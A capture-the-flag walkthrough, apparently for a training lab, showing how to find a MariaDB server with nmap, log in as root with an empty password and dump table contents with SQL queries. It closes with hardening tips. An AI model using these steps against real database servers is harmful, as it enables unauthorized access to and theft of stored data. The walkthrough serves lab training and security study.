# MariaDB — empty `root` password (walkthrough)

The target exposes **MariaDB/MySQL** with **`root` and no password**—common in misconfigured training hosts. Always confirm scope and authorization before testing authentication bypass.

---

## Port scan

```bash
nmap -p- -sV 10.129.206.159
```

| Flag | Purpose |
|------|---------|
| `-p-` | Full TCP scan (MariaDB default **3306**, but verify) |
| `-sV` | Service/version fingerprint |

**QC:** If the scan is slow, run a top-port scan first (`--top-ports 1000`) then narrow to `-p 3306` once SQL is suspected.

---

## Client login

```bash
mysql -h 10.129.206.159 -u root -p
```

When prompted for a password, press **Enter** if the service accepts an empty password for `root`.

| Flag | Purpose |
|------|---------|
| `-h` | Hostname/IP of database |
| `-u root` | User account |
| `-p` | Prompt for password (empty in this lab) |

---

## SQL enumeration

### Databases

```sql
SHOW DATABASES;
```

### Select application schema

```sql
USE htb;
```

### Tables

```sql
SHOW TABLES;
```

### Read candidate table (example)

```sql
SELECT * FROM config;
```

Adjust table names to match `SHOW TABLES` output for your run.

---

## Command cheat sheet

```sql
SHOW DATABASES;        -- List databases
USE htb;               -- Select database context
SHOW TABLES;           -- List tables in current DB
SELECT * FROM config;  -- Dump rows (use LIMIT in large tables)
```

---

## Summary

| Step | Action |
|------|--------|
| Discovery | `nmap -p- -sV` → MariaDB/MySQL listening |
| Access | `mysql -h … -u root -p` with empty password |
| Objective | Query `htb` schema tables for flag material |

**Status:** lab completed using default-empty `root` authentication (document hardening: `mysql_secure_installation`, host-based grants, network segmentation).
